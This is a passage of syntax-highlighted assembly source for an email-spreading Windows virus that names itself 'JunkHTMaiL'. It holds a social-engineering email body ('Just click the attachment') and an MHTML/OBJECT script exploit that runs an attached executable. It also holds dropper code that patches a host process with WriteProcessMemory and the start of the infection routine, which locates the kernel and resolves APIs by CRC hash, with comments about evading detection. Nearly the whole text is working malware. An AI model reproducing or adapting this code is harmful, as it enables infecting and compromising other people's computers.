</span><span class="sc5">body1</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"Just click the attachment"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
</span><span class="sc5">body2</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"If the attachment is blocked by Outlook 2002 then see"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
</span><span class="sc5">body3</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"http://support.microsoft.com/support/kb/articles/q290/4/97.asp"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc0">
</span><span class="sc5">body4</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">part21</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part22</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"TEXT/PLAIN;"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part22</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part23</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" NAME=EMAIL.HTM"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part23</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part24</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CONTENT-TRANSFER-ENCODING:"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part24</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part25</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"QUOTED-PRINTABLE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part25</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part26</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CONTENT-DISPOSITION:"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part26</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part27</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ATTACHMENT"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part27</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part28</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CONTENT-LOCATION:FILE:///.EXE"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part28</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part31</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"BASE64"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;just a bit too long for a single line... unless you remove the "moveBy"...</span><span class="sc0">

</span><span class="sc5">part31</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part32</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"&lt;SCRIPT&gt;moveBy(9999);with(document)write("</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"&lt;OBJECT CLASSID='CLSID:1BADDEED'"</span><span class="sc0">
</span><span class="sc5">part32</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part41</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"CODEBASE='MHTML:"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"+URL+"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"!FILE:///.EXE'&gt;&lt;/OBJECT&gt;"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">")&lt;/SCRIPT&gt;"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">part41</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part42</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part42</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">part43</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"QUIT"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">part43</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">junkhtml.inc</span><span class="sc0">

</span><span class="sc5">txttitle</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"JunkHTMaiL"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">compress_only</span><span class="sc0">
</span><span class="sc5">txtbody</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"compress done"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">else</span><span class="sc0">
</span><span class="sc5">txtbody</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"running..."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">patch_host</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_patch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteProcessMemory</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">junkhtml_inf</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;everything before this point is dropper code</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;virus code begins here in infected files</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">junkhtml_inf</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">walk_seh</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">expcrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">expcrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">expcrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drop_exp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">expcrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"JunkHTMaiL - roy g biv"</span><span class="sc0">        </span><span class="sc1">;spam just got harder to remove ;)</span><span class="sc0">

</span><span class="sc5">walk_seh</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">seh_loop</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">seh_loop</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;moved label after some data because "e800000000" looks like virus code ;)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">init_findmz</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">find_mzhdr</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;do not use hard-coded kernel address values because it is not portable</span><span class="sc0">
</span><span class="sc1">;Microsoft used all different values for 95, 98, NT, 2000, Me, XP</span><span class="sc0">
</span><span class="sc1">;they will maybe change again for every new release</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;sub 64kb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;64kb align</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_pehdr</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_mzhdr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;parse export table</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.peexport.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">peexp.expordbase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;Ordinal Base</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;Export Address Table RVA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;Name Pointer Table RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Ordinal Table RVA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">push_export</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">get_export</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;Name Pointer VA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">crc_outer</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">crc_inner</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">crc_skip</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c11db7h</span><span class="sc0">                   </span><span class="sc1">;use generator polymonial (see IEEE 802)</span><span class="sc0">

</span><span class="sc5">crc_skip</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">crc_inner</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;carry set if not zero</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;carry not altered by inc</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">crc_outer</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">get_export</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;exports must be sorted alphabetically, otherwise GetProcAddress() would fail</span><span class="sc0">
</span><span class="sc1">;this allows to push addresses onto the stack, and the order is known</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;Name Pointer Table VA</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get export ordinal</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get export RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">scas</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
